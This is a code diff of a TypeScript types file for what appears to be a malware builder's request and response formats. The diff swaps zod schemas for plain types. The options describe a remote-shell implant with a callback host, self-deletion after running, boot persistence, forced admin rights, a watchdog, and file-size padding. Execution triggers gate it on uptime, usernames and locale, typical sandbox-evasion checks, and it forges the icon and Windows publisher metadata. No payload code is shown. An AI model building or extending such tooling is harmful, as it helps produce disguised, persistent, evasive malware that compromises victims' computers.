@@ -1,5 +1,3 @@
-import { z } from "zod";
-
 export const TARGET_OS_VALUES = ["windows", "linux", "darwin"] as const;
 export type TargetOS = (typeof TARGET_OS_VALUES)[number];
 
@@ -20,108 +18,86 @@ export const ALLOWED_EXTENSIONS_BY_OS: Record<TargetOS, readonly string[]> = {
   darwin: [".bin"] as const,
 };
 
-const numericString = z.union([z.string(), z.number()]);
+export type NumericString = string | number;
 
-const customHeaderSchema = z
-  .object({
-    key: z.string(),
-    value: z.string(),
-  })
-  .strict();
+export type CustomHeader = {
+  key: string;
+  value: string;
+};
 
-const customCookieSchema = z
-  .object({
-    name: z.string(),
-    value: z.string(),
-  })
-  .strict();
+export type CustomCookie = {
+  name: string;
+  value: string;
+};
 
-const watchdogSchema = z
-  .object({
-    enabled: z.boolean(),
-    intervalSeconds: z.number().int().positive(),
-  })
-  .strict();
+export type WatchdogSettings = {
+  enabled: boolean;
+  intervalSeconds: number;
+};
 
-const filePumperSchema = z
-  .object({
-    enabled: z.boolean(),
-    targetBytes: z.number().int().positive(),
-  })
-  .strict();
+export type FilePumperSettings = {
+  enabled: boolean;
+  targetBytes: number;
+};
 
-const executionTriggersSchema = z
-  .object({
-    delaySeconds: z.number().int().nonnegative().optional(),
-    minUptimeMinutes: z.number().int().nonnegative().optional(),
-    allowedUsernames: z.array(z.string()).optional(),
-    allowedLocales: z.array(z.string()).optional(),
-    requireInternet: z.boolean().optional(),
-    startTime: z.string().optional(),
-    endTime: z.string().optional(),
-  })
-  .strict();
+export type ExecutionTriggers = {
+  delaySeconds?: number;
+  minUptimeMinutes?: number;
+  allowedUsernames?: string[];
+  allowedLocales?: string[];
+  requireInternet?: boolean;
+  startTime?: string;
+  endTime?: string;
+};
 
-const fileIconSchema = z
-  .object({
-    name: z.string().optional().nullable(),
-    data: z.string(),
-  })
-  .strict();
+export type FileIcon = {
+  name?: string | null;
+  data: string;
+};
 
-const windowsFileInformationSchema = z
-  .object({
-    fileDescription: z.string().optional(),
-    productName: z.string().optional(),
-    companyName: z.string().optional(),
-    productVersion: z.string().optional(),
-    fileVersion: z.string().optional(),
-    originalFilename: z.string().optional(),
-    internalName: z.string().optional(),
-    legalCopyright: z.string().optional(),
-  })
-  .strict();
+export type WindowsFileInformation = {
+  fileDescription?: string;
+  productName?: string;
+  companyName?: string;
+  productVersion?: string;
+  fileVersion?: string;
+  originalFilename?: string;
+  internalName?: string;
+  legalCopyright?: string;
+};
 
-export const buildRequestSchema = z
-  .object({
-    host: z.union([z.string(), z.number()]),
-    port: numericString.optional(),
-    outputFilename: z.string().optional(),
-    outputExtension: z.string().optional(),
-    targetOS: z.enum(TARGET_OS_VALUES).optional(),
-    targetArch: z.enum(["amd64", "386", "arm64"]).optional(),
-    installationPath: z.string().optional(),
-    meltAfterRun: z.boolean().optional(),
-    startupOnBoot: z.boolean().optional(),
-    developerMode: z.boolean().optional(),
-    mutexName: z.string().optional(),
-    compressBinary: z.boolean().optional(),
-    forceAdmin: z.boolean().optional(),
-    pollIntervalMs: numericString.optional(),
-    maxBackoffMs: numericString.optional(),
-    shellTimeoutSeconds: numericString.optional(),
-    watchdog: watchdogSchema.optional(),
-    filePumper: filePumperSchema.optional(),
-    executionTriggers: executionTriggersSchema.optional(),
-    customHeaders: z.array(customHeaderSchema).optional(),
-    customCookies: z.array(customCookieSchema).optional(),
-    fileIcon: fileIconSchema.optional(),
-    fileInformation: windowsFileInformationSchema.optional(),
-  })
-  .strict();
+export type BuildRequest = {
+  host: string | number;
+  port?: NumericString;
+  outputFilename?: string;
+  outputExtension?: string;
+  targetOS?: TargetOS;
+  targetArch?: TargetArch;
+  installationPath?: string;
+  meltAfterRun?: boolean;
+  startupOnBoot?: boolean;
+  developerMode?: boolean;
+  mutexName?: string;
+  compressBinary?: boolean;
+  forceAdmin?: boolean;
+  pollIntervalMs?: NumericString;
+  maxBackoffMs?: NumericString;
+  shellTimeoutSeconds?: NumericString;
+  watchdog?: WatchdogSettings;
+  filePumper?: FilePumperSettings;
+  executionTriggers?: ExecutionTriggers;
+  customHeaders?: CustomHeader[];
+  customCookies?: CustomCookie[];
+  fileIcon?: FileIcon;
+  fileInformation?: WindowsFileInformation;
+};
 
-export type BuildRequest = z.infer<typeof buildRequestSchema>;
-
-export const buildResponseSchema = z
-  .object({
-    success: z.boolean(),
-    message: z.string(),
-    outputPath: z.string().optional(),
-    downloadUrl: z.string().optional(),
-    log: z.array(z.string()).optional(),
-    sharedSecret: z.string().optional(),
-    warnings: z.array(z.string()).optional(),
-  })
-  .strict();
-
-export type BuildResponse = z.infer<typeof buildResponseSchema>;
+export type BuildResponse = {
+  success: boolean;
+  message: string;
+  outputPath?: string;
+  downloadUrl?: string;
+  log?: string[];
+  sharedSecret?: string;
+  warnings?: string[];
+};
